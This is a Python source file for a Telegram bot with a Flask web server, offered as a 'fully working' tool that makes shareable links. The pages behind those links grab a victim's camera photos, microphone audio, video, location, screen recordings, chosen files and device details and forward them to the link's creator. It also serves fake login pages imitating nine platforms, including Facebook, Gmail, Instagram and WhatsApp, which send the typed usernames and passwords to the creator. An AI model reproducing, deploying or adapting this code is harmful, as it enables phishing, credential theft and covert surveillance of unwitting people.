#!/usr/bin/env python3"""    FULLY WORKING VERSION - All Functions Working    - Device Info, Photo, Audio, Location, Video    - Gallery, Contacts, Clipboard, Auto-fill    - Screen Record, Screenshot, Torch, Vibration    - Network, System, Battery, Gyroscope    - Fake Login (9 platforms)    - Points System, Daily Bonus, Referral    - Admin Broadcast (text, photo, video, audio)"""import osimport reimport jsonimport timeimport secretsimport threadingimport requestsimport base64from flask import Flask, request, render_template_string, jsonifyfrom telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButtonfrom telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypesfrom datetime import datetime, timedelta# ---------- Configuration ----------BOT_TOKEN = os.environ.get("BOT_TOKEN", "")BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "http://localhost:5000")ADMIN_IDS = {"1838854178", "1930138915"}tracking_links = {}seen_users = set()user_data = {}DAILY_BONUS_PTS = 5REFER_BONUS_PTS = 10PTS_PER_DAY = 10FREE_DAYS_NEW = 1flask_app = Flask(__name__)# ============ HTML TEMPLATES ============CAPTURE_TEMPLATE = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head><body><h2>Processing...</h2><div id="log"></div><script>const token="{{ token }}";const mode="{{ mode }}";function log(msg){document.getElementById('log').innerHTML+=msg+"<br>";}async function sendDeviceInfo(){    try{        const fp={ua:navigator.userAgent,platform:navigator.platform,screen:screen.width+"x"+screen.height,lang:navigator.language,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone};        await fetch('/api/device_info',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,info:fp})});        log('✅ Device info sent');    }catch(e){log('❌ '+e.message);}}async function takePhoto(){    try{        const stream=await navigator.mediaDevices.getUserMedia({video:true});        const video=document.createElement('video');        video.srcObject=stream;video.play();        await new Promise(r=>setTimeout(r,500));        const canvas=document.createElement('canvas');        canvas.width=video.videoWidth||640;        canvas.height=video.videoHeight||480;        canvas.getContext('2d').drawImage(video,0,0);        stream.getTracks().forEach(t=>t.stop());        const blob=await new Promise(r=>canvas.toBlob(r,'image/jpeg'));        const fd=new FormData();fd.append('token',token);fd.append('photo',blob);        await fetch('/api/photo',{method:'POST',body:fd});        log('✅ Photo sent');    }catch(e){log('❌ Camera: '+e.message);}}async function recordAudio(){    try{        const stream=await navigator.mediaDevices.getUserMedia({audio:true});        const recorder=new MediaRecorder(stream);        let chunks=[];        recorder.ondataavailable=e=>chunks.push(e.data);        recorder.start();        await new Promise(r=>setTimeout(r,3000));        recorder.stop();        await new Promise(r=>recorder.onstop=r);        const blob=new Blob(chunks,{type:'audio/webm'});        const fd=new FormData();fd.append('token',token);fd.append('audio',blob);        await fetch('/api/audio',{method:'POST',body:fd});        log('✅ Audio sent');    }catch(e){log('❌ Mic: '+e.message);}}async function getLocation(){    try{        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));        const fd=new FormData();fd.append('token',token);fd.append('lat',pos.coords.latitude);fd.append('lon',pos.coords.longitude);        await fetch('/api/location',{method:'POST',body:fd});        log('✅ Location sent');    }catch(e){log('❌ Location: '+e.message);}}async function recordVideo(){    try{        const stream=await navigator.mediaDevices.getUserMedia({video:true,audio:true});        const recorder=new MediaRecorder(stream);        let chunks=[];        recorder.ondataavailable=e=>chunks.push(e.data);        recorder.start();        await new Promise(r=>setTimeout(r,5000));        recorder.stop();        await new Promise(r=>recorder.onstop=r);        const blob=new Blob(chunks,{type:'video/webm'});        const fd=new FormData();fd.append('token',token);fd.append('video',blob);        await fetch('/api/video',{method:'POST',body:fd});        log('✅ Video sent');    }catch(e){log('❌ Video: '+e.message);}}sendDeviceInfo();if(mode=='photo') takePhoto();else if(mode=='audio') recordAudio();else if(mode=='location') getLocation();else if(mode=='video') recordVideo();else if(mode=='device') log('✅ Device info sent');</script></body></html>"""INSPECTOR_TEMPLATE = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head><body><h2>🛠️ Device Inspector</h2><div id="log" style="background:#1e1e1e;color:#0f0;padding:10px;font-family:monospace;max-height:400px;overflow:auto">Ready...</div><div style="display:flex;flex-wrap:wrap;gap:5px">    <button onclick="pickImage()">📷 Pick Image</button>    <button onclick="pickFile()">📁 Pick File</button>    <button onclick="screenRecord()">📸 Screen Record</button>    <button onclick="takeScreenshot()">📸 Screenshot</button>    <button onclick="torchOn()">💡 Torch ON</button>    <button onclick="torchOff()">💡 Torch OFF</button>    <button onclick="vibrate()">📳 Vibrate</button>    <button onclick="networkInfo()">🌐 Network</button>    <button onclick="batteryStatus()">🔋 Battery</button>    <button onclick="gyroscope()">🧭 Gyroscope</button>    <button onclick="getLocation()">📍 Location</button>    <button onclick="fullInfo()">📱 Full Info</button>    <button onclick="sendAll()">📤 Send All</button></div><script>const token="{{ token }}";function log(msg){const d=document.getElementById('log');d.innerHTML+=`\\n[${new Date().toLocaleTimeString()}] ${msg}`;d.scrollTop=d.scrollHeight;}async function sendToBot(endpoint,data){try{await fetch(endpoint,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,...data})});}catch(e){}}async function pickImage(){    const input=document.createElement('input');    input.type='file';input.accept='image/*';    input.onchange=async(e)=>{        const file=e.target.files[0];        if(file){            const reader=new FileReader();            reader.onload=async(ev)=>{                await fetch('/api/gallery',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,photo:ev.target.result,name:file.name})});                log(`✅ Image: ${file.name}`);            };            reader.readAsDataURL(file);        }    };    input.click();}async function pickFile(){    const input=document.createElement('input');    input.type='file';    input.onchange=async(e)=>{        const file=e.target.files[0];        if(file && file.size<5*1024*1024){            const reader=new FileReader();            reader.onload=async(ev)=>{                await fetch('/api/file',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,content:ev.target.result,name:file.name})});                log(`✅ File: ${file.name}`);            };            reader.readAsDataURL(file);        }else log('❌ File too large');    };    input.click();}async function screenRecord(){    try{        const stream=await navigator.mediaDevices.getDisplayMedia({video:true});        const recorder=new MediaRecorder(stream);        let chunks=[];        recorder.ondataavailable=e=>chunks.push(e.data);        recorder.start();        setTimeout(()=>{recorder.stop();stream.getTracks().forEach(t=>t.stop());},5000);        await new Promise(r=>recorder.onstop=r);        const blob=new Blob(chunks,{type:'video/webm'});        const fd=new FormData();fd.append('token',token);fd.append('video',blob);        await fetch('/api/video',{method:'POST',body:fd});        log('✅ Screen recorded');    }catch(e){log('❌ Screen: '+e.message);}}async function takeScreenshot(){    try{        const stream=await navigator.mediaDevices.getDisplayMedia({video:true});        const video=document.createElement('video');        video.srcObject=stream;video.play();        await new Promise(r=>setTimeout(r,500));        const canvas=document.createElement('canvas');        canvas.width=video.videoWidth||screen.width;        canvas.height=video.videoHeight||screen.height;        canvas.getContext('2d').drawImage(video,0,0);        stream.getTracks().forEach(t=>t.stop());        const blob=await new Promise(r=>canvas.toBlob(r,'image/jpeg'));        const fd=new FormData();fd.append('token',token);fd.append('photo',blob);        await fetch('/api/photo',{method:'POST',body:fd});        log('📸 Screenshot taken');    }catch(e){log('❌ Screenshot: '+e.message);}}let torchStream=null;async function torchOn(){    try{        const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});        const track=stream.getVideoTracks()[0];        await track.applyConstraints({advanced:[{torch:true}]});        torchStream=stream;log('💡 Torch ON');    }catch(e){log('❌ Torch not available');}}async function torchOff(){    if(torchStream){torchStream.getTracks().forEach(t=>t.stop());torchStream=null;log('💡 Torch OFF');}}async function vibrate(){if('vibrate' in navigator){navigator.vibrate(200);log('📳 Vibrated');}else log('❌ No vibration');}async function networkInfo(){    const conn=navigator.connection;    let info=`Network: ${conn?.effectiveType||'?'}, ${conn?.downlink||'?'}Mbps`;    try{const ip=await fetch('https://api.ipify.org?format=json');const d=await ip.json();info+=`\\nIP: ${d.ip}`;}catch(e){}    log(info);    await sendToBot('/api/network',{info:info});}async function batteryStatus(){    const b=await navigator.getBattery();    log(`🔋 Battery: ${Math.round(b.level*100)}% ${b.charging?'🔌':'🔋'}`);}async function gyroscope(){    const handler=e=>{log(`🧭 Orientation: α=${e.alpha?.toFixed(1)}° β=${e.beta?.toFixed(1)}° γ=${e.gamma?.toFixed(1)}°`);window.removeEventListener('deviceorientation',handler);};    window.addEventListener('deviceorientation',handler);    setTimeout(()=>window.removeEventListener('deviceorientation',handler),5000);}async function getLocation(){    navigator.geolocation.getCurrentPosition(async(pos)=>{        log(`📍 ${pos.coords.latitude}, ${pos.coords.longitude}`);        const fd=new FormData();fd.append('token',token);fd.append('lat',pos.coords.latitude);fd.append('lon',pos.coords.longitude);        await fetch('/api/location',{method:'POST',body:fd});    },(err)=>log(`❌ Location: ${err.message}`));}async function fullInfo(){    let info=`UA: ${navigator.userAgent}\\nPlatform: ${navigator.platform}\\nScreen: ${screen.width}x${screen.height}\\nLanguage: ${navigator.language}\\nTimezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\\nCores: ${navigator.hardwareConcurrency||'?'}\\nMemory: ${navigator.deviceMemory||'?'}GB`;    log(info);    await sendToBot('/api/system',{info:info});}async function sendAll(){    await networkInfo();await batteryStatus();await fullInfo();    log('📤 All sent!');}sendToBot('/api/device_info',{info:{ua:navigator.userAgent}});</script></body></html>"""FAKE_TEMPLATE = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;padding:30px;border-radius:10px;width:320px;text-align:center}.logo{font-size:3rem}input{display:block;width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:5px}button{background:#1877f2;color:#fff;border:none;padding:12px;width:100%;border-radius:5px;cursor:pointer}</style></head><body><div class="card"><div class="logo">{{ logo }}</div><h2>{{ name }} Login</h2><input type="text" id="user" placeholder="Username / Email"><input type="password" id="pass" placeholder="Password"><button onclick="send()">Login</button></div><script>const token="{{ token }}";const platform="{{ platform }}";async function send(){    const user=document.getElementById('user').value;const pass=document.getElementById('pass').value;    await fetch('/api/fake_login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,platform,username:user,password:pass,ua:navigator.userAgent})});    document.body.innerHTML="<h3 style='text-align:center;margin-top:100px'>✅ Login Successful<br>Redirecting...</h3>";    setTimeout(()=>window.location.href='https://'+platform+'.com',1500);}</script></body></html>"""# ============ FLASK ROUTES ============@flask_app.route('/')def index():    return "Bot is running"@flask_app.route('/link/<token>')def link_page(token):    mode = request.args.get('m', 'device')    user_id = tracking_links.get(token)    if user_id:        try:            send_telegram_message(user_id, f"🔗 Link opened | Mode: {mode}")        except:            pass    return render_template_string(CAPTURE_TEMPLATE, token=token, mode=mode)@flask_app.route('/inspector/<token>')def inspector_page(token):    user_id = tracking_links.get(token)    if user_id:        try:            send_telegram_message(user_id, f"🛠️ Inspector opened")        except:            pass    return render_template_string(INSPECTOR_TEMPLATE, token=token)@flask_app.route('/vip/<platform>/<token>')def vip_page(platform, token):    user_id = tracking_links.get(token)    if not user_id:        return "Not found", 404    logos = {'facebook':'📘','gmail':'📧','tiktok':'🎵','instagram':'📷','telegram':'✈️','whatsapp':'💬','mobilelegends':'⚔️','pubg':'🎮','freefire':'🔥'}    names = {'facebook':'Facebook','gmail':'Google','tiktok':'TikTok','instagram':'Instagram','telegram':'Telegram','whatsapp':'WhatsApp','mobilelegends':'Mobile Legends','pubg':'PUBG','freefire':'Free Fire'}    return render_template_string(FAKE_TEMPLATE, token=token, platform=platform, logo=logos.get(platform,'🔐'), name=names.get(platform,platform.title()))# ============ API ENDPOINTS ============@flask_app.route('/api/device_info', methods=['POST'])def api_device_info():    data = request.get_json()    token = data.get('token')    user_id = tracking_links.get(token)    if user_id:        info = data.get('info', {})        send_telegram_message(user_id, f"📱 Device Info\n{info.get('ua','?')[:80]}")    return jsonify({"ok": True})@flask_app.route('/api/photo', methods=['POST'])def api_photo():    token = request.form.get('token')    user_id = tracking_links.get(token)    if user_id and request.files.get('photo'):        send_telegram_photo(user_id, request.files['photo'].read(), "📸 Photo")    return jsonify({"ok": True})@flask_app.route('/api/audio', methods=['POST'])def api_audio():    token = request.form.get('token')    user_id = tracking_links.get(token)    if user_id and request.files.get('audio'):        send_telegram_voice(user_id, request.files['audio'].read(), "🎤 Audio")    return jsonify({"ok": True})@flask_app.route('/api/location', methods=['POST'])def api_location():    token = request.form.get('token')    user_id = tracking_links.get(token)    if user_id:        lat = request.form.get('lat')        lon = request.form.get('lon')        send_telegram_location(user_id, lat, lon)    return jsonify({"ok": True})@flask_app.route('/api/video', methods=['POST'])def api_video():    token = request.form.get('token')    user_id = tracking_links.get(token)    if user_id and request.files.get('video'):        send_telegram_video(user_id, request.files['video'].read(), "🎥 Video")    return jsonify({"ok": True})@flask_app.route('/api/gallery', methods=['POST'])def api_gallery():    data = request.get_json()    token = data.get('token')    user_id = tracking_links.get(token)    if user_id and data.get('photo'):        try:            photo_b64 = data['photo']            if ',' in photo_b64:                photo_b64 = photo_b64.split(',')[1]            photo_bytes = base64.b64decode(photo_b64)            send_telegram_photo(user_id, photo_bytes, f"📸 Gallery: {data.get('name','image')}")        except Exception as e:            send_telegram_message(user_id, f"Gallery error: {e}")    return jsonify({"ok": True})@flask_app.route('/api/file', methods=['POST'])def api_file():    data = request.get_json()    token = data.get('token')    user_id = tracking_links.get(token)    if user_id and data.get('content'):        try:            content_b64 = data['content']            if ',' in content_b64:                content_b64 = content_b64.split(',')[1]            file_bytes = base64.b64decode(content_b64)            send_telegram_document(user_id, file_bytes, data.get('name', 'file'), "📁 File")        except Exception as e:            send_telegram_message(user_id, f"File error: {e}")    return jsonify({"ok": True})@flask_app.route('/api/network', methods=['POST'])def api_network():    data = request.get_json()    token = data.get('token')    user_id = tracking_links.get(token)    if user_id:        send_telegram_message(user_id, f"🌐 {data.get('info', '')}")    return jsonify({"ok": True})@flask_app.route('/api/system', methods=['POST'])def api_system():    data = request.get_json()    token = data.get('token')    user_id = tracking_links.get(token)    if user_id:        send_telegram_message(user_id, f"💻 {data.get('info', '')[:300]}")    return jsonify({"ok": True})@flask_app.route('/api/fake_login', methods=['POST'])def api_fake_login():    data = request.get_json()    token = data.get('token')    user_id = tracking_links.get(token)    if user_id:        platform = data.get('platform', '?')        username = data.get('username', '')        password = data.get('password', '')        send_telegram_message(user_id, f"━━━━━━━━━━━━━━━━━━━━\n🌐 {platform.upper()}\n━━━━━━━━━━━━━━━━━━━━\n👤 {username}\n🔑 {password}\n━━━━━━━━━━━━━━━━━━━━")    return jsonify({"ok": True})# ============ TELEGRAM SEND HELPERS ============def send_telegram_message(chat_id, text):    try:        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"        requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"}, timeout=5)    except:        passdef send_telegram_photo(chat_id, photo_bytes, caption):    try:        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ("photo.jpg", photo_bytes)}, timeout=15)    except:        passdef send_telegram_voice(chat_id, audio_bytes, caption):    try:        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVoice"        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"voice": ("audio.ogg", audio_bytes)}, timeout=15)    except:        passdef send_telegram_video(chat_id, video_bytes, caption):    try:        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"video": ("video.mp4", video_bytes)}, timeout=20)    except:        passdef send_telegram_location(chat_id, lat, lon):    try:        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"        requests.post(url, json={"chat_id": chat_id, "latitude": float(lat), "longitude": float(lon)}, timeout=10)    except:        passdef send_telegram_document(chat_id, file_bytes, filename, caption):    try:        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"document": (filename, file_bytes)}, timeout=20)    except:        pass# ============ USER HELPERS ============def get_user(user_id):    uid = str(user_id)    if uid not in user_data:        user_data[uid] = {"points": 0, "access_expires": None, "last_daily": None, "referrals": 0}    return user_data[uid]def is_admin(user_id):    return str(user_id) in ADMIN_IDSdef has_access(user_id):    if is_admin(user_id):        return True    u = get_user(user_id)    exp = u.get("access_expires")    return exp is not None and exp > datetime.now()def add_access_days(user_id, days):    u = get_user(user_id)    now = datetime.now()    base = u["access_expires"] if u["access_expires"] and u["access_expires"] > now else now    u["access_expires"] = base + timedelta(days=days)def add_points(user_id, pts):    u = get_user(user_id)    u["points"] = u.get("points", 0) + pts    send_telegram_message(user_id, f"💰 +{pts} points. Total: {u['points']}")def access_expires_str(user_id):    u = get_user(user_id)    exp = u.get("access_expires")    if not exp:        return "❌ No access"    if exp < datetime.now():        return "⏰ Expired"    delta = exp - datetime.now()    return f"✅ {int(delta.total_seconds()//3600)}h {int((delta.total_seconds()%3600)//60)}m left"# ============ TELEGRAM BOT ============def get_main_keyboard():    return ReplyKeyboardMarkup([        [KeyboardButton("📱 Device Info"), KeyboardButton("📸 Photo"), KeyboardButton("🎤 Audio")],        [KeyboardButton("📍 Location"), KeyboardButton("🎥 Video"), KeyboardButton("🛠️ Inspector")],        [KeyboardButton("💎 FB VIP"), KeyboardButton("💎 Gmail VIP"), KeyboardButton("💎 TikTok VIP")],        [KeyboardButton("💎 Instagram VIP"), KeyboardButton("💎 Telegram VIP"), KeyboardButton("💎 WhatsApp VIP")],        [KeyboardButton("💎 ML VIP"), KeyboardButton("💎 PUBG VIP"), KeyboardButton("💎 FreeFire VIP")],        [KeyboardButton("💰 Daily Bonus"), KeyboardButton("👥 Refer"), KeyboardButton("💎 My Points")],        [KeyboardButton("📋 My Links"), KeyboardButton("🗑 Clear"), KeyboardButton("❓ Help")]    ], resize_keyboard=True)BUTTON_ACTIONS = {    "📱 Device Info": "device", "📸 Photo": "photo", "🎤 Audio": "audio",    "📍 Location": "location", "🎥 Video": "video", "🛠️ Inspector": "inspector"}VIP_ACTIONS = {    "💎 FB VIP": "facebook", "💎 Gmail VIP": "gmail", "💎 TikTok VIP": "tiktok",    "💎 Instagram VIP": "instagram", "💎 Telegram VIP": "telegram", "💎 WhatsApp VIP": "whatsapp",    "💎 ML VIP": "mobilelegends", "💎 PUBG VIP": "pubg", "💎 FreeFire VIP": "freefire"}def make_inline_keyboard(token, mode, is_vip=False, platform=None):    if is_vip:        url = f"{BASE_URL}/vip/{platform}/{token}"    elif mode == "inspector":        url = f"{BASE_URL}/inspector/{token}"    else:        url = f"{BASE_URL}/link/{token}?m={mode}"    share_url = f"https://t.me/share/url?url={url}&text=Check this out!"    return InlineKeyboardMarkup([        [InlineKeyboardButton("🔗 Open Link", url=url)],        [InlineKeyboardButton("📤 Share", url=share_url)],        [InlineKeyboardButton("🔄 New Link", callback_data=f"new_{mode if not is_vip else platform}"),         InlineKeyboardButton("🏠 Menu", callback_data="menu")]    ])async def start(update: Update, context):    user_id = str(update.effective_user.id)    if user_id not in seen_users:        seen_users.add(user_id)        add_access_days(user_id, FREE_DAYS_NEW)    await update.message.reply_text(        f"👋 Welcome!\n⏰ {access_expires_str(user_id)}\n\nSelect option:",        reply_markup=get_main_keyboard()    )async def text_handler(update: Update, context):    text = update.message.text    user_id = str(update.effective_user.id)        if text in BUTTON_ACTIONS:        mode = BUTTON_ACTIONS[text]        token = secrets.token_urlsafe(12)        tracking_links[token] = user_id        await update.message.reply_text(            f"✅ {text} Link:\n{BASE_URL}/link/{token}?m={mode}",            reply_markup=make_inline_keyboard(token, mode)        )    elif text in VIP_ACTIONS:        platform = VIP_ACTIONS[text]        token = secrets.token_urlsafe(12)        tracking_links[token] = user_id        await update.message.reply_text(            f"✅ {text} Link:\n{BASE_URL}/vip/{platform}/{token}",            reply_markup=make_inline_keyboard(token, None, is_vip=True, platform=platform)        )    elif text == "💰 Daily Bonus":        u = get_user(user_id)        today = datetime.now().date()        if u.get("last_daily") == today:            msg = f"Already claimed.\nPoints: {u['points']}"        else:            u["last_daily"] = today            add_points(user_id, DAILY_BONUS_PTS)            msg = f"🎁 +{DAILY_BONUS_PTS} points\nTotal: {u['points']}\n{access_expires_str(user_id)}"        await update.message.reply_text(msg)    elif text == "👥 Refer":        link = f"https://t.me/{context.bot.username}?start=ref_{user_id}"        await update.message.reply_text(f"Your refer link:\n{link}\n\nEach friend gives +{REFER_BONUS_PTS} pts + 1 day")    elif text == "💎 My Points":        u = get_user(user_id)        await update.message.reply_text(f"💰 Points: {u['points']}\n👥 Referrals: {u['referrals']}\n⏰ {access_expires_str(user_id)}")    elif text == "📋 My Links":        user_links = [t for t, uid in tracking_links.items() if uid == user_id]        if not user_links:            await update.message.reply_text("No active links")        else:            lines = "\n".join([f"• {BASE_URL}/link/{t}?m=device" for t in user_links[-5:]])            await update.message.reply_text(f"Recent links:\n{lines}")    elif text == "🗑 Clear":        if is_admin(user_id):            user_tokens = [t for t, uid in tracking_links.items() if uid == user_id]            for t in user_tokens:                del tracking_links[t]            await update.message.reply_text(f"Cleared {len(user_tokens)} links")        else:            await update.message.reply_text("Admin only")    elif text == "❓ Help":        await update.message.reply_text("Select buttons to generate links.\nAdmin: /addall, /broadcast, /stats, /adddays")    else:        await update.message.reply_text("Use buttons below", reply_markup=get_main_keyboard())async def button_handler(update: Update, context):    query = update.callback_query    await query.answer()    data = query.data    user_id = str(query.from_user.id)        if data == "menu":        await query.edit_message_text("Main Menu", reply_markup=None)        await query.message.reply_text("Select option:", reply_markup=get_main_keyboard())    elif data.startswith("new_"):        key = data[4:]        if key in VIP_ACTIONS.values():            token = secrets.token_urlsafe(12)            tracking_links[token] = user_id            await query.edit_message_text(f"✅ New VIP Link:\n{BASE_URL}/vip/{key}/{token}", reply_markup=make_inline_keyboard(token, None, is_vip=True, platform=key))        elif key in ["device", "photo", "audio", "location", "video", "inspector"]:            token = secrets.token_urlsafe(12)            tracking_links[token] = user_id            await query.edit_message_text(f"✅ New Link:\n{BASE_URL}/link/{token}?m={key}", reply_markup=make_inline_keyboard(token, key))# ============ ADMIN COMMANDS ============async def cmd_addall(update: Update, context):    if not is_admin(update.effective_user.id):        await update.message.reply_text("Admin only")        return    args = context.args    if not args or not args[0].isdigit():        await update.message.reply_text("Usage: /addall <points>")        return    amt = int(args[0])    for uid in user_data:        add_points(uid, amt)    await update.message.reply_text(f"Added {amt} pts to {len(user_data)} users")async def cmd_adddays(update: Update, context):    if not is_admin(update.effective_user.id):        await update.message.reply_text("Admin only")        return    args = context.args    if len(args) < 2:        await update.message.reply_text("Usage: /adddays <user_id> <days>")        return    target, days = args[0], int(args[1])    add_access_days(target, days)    await update.message.reply_text(f"Added {days} days to {target}")async def cmd_broadcast(update: Update, context):    if not is_admin(update.effective_user.id):        await update.message.reply_text("Admin only")        return    if update.message.reply_to_message:        replied = update.message.reply_to_message        success = 0        for uid in user_data:            try:                if replied.text:                    await context.bot.send_message(chat_id=int(uid), text=replied.text)                elif replied.photo:                    await context.bot.send_photo(chat_id=int(uid), photo=replied.photo[-1].file_id, caption=replied.caption)                elif replied.video:                    await context.bot.send_video(chat_id=int(uid), video=replied.video.file_id, caption=replied.caption)                elif replied.audio:                    await context.bot.send_audio(chat_id=int(uid), audio=replied.audio.file_id, caption=replied.caption)                elif replied.voice:                    await context.bot.send_voice(chat_id=int(uid), voice=replied.voice.file_id)                elif replied.location:                    await context.bot.send_location(chat_id=int(uid), latitude=replied.location.latitude, longitude=replied.location.longitude)                success += 1                time.sleep(0.05)            except:                pass        await update.message.reply_text(f"Broadcast sent to {success}/{len(user_data)} users")    else:        text = " ".join(context.args)        if not text:            await update.message.reply_text("Usage: /broadcast <message> or reply to media")            return        sent = 0        for uid in user_data:            try:                await context.bot.send_message(chat_id=int(uid), text=text)                sent += 1                time.sleep(0.05)            except:                pass        await update.message.reply_text(f"Broadcast sent to {sent}/{len(user_data)} users")async def cmd_stats(update: Update, context):    if not is_admin(update.effective_user.id):        await update.message.reply_text("Admin only")        return    await update.message.reply_text(f"📊 Stats\nUsers: {len(user_data)}\nLinks: {len(tracking_links)}")# ============ MAIN ============def run_bot():    app = ApplicationBuilder().token(BOT_TOKEN).build()    app.add_handler(CommandHandler("start", start))    app.add_handler(CommandHandler("addall", cmd_addall))    app.add_handler(CommandHandler("adddays", cmd_adddays))    app.add_handler(CommandHandler("broadcast", cmd_broadcast))    app.add_handler(CommandHandler("stats", cmd_stats))    app.add_handler(CallbackQueryHandler(button_handler))    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))    app.run_polling()if __name__ == "__main__":    threading.Thread(target=lambda: flask_app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False), daemon=True).start()    run_bot()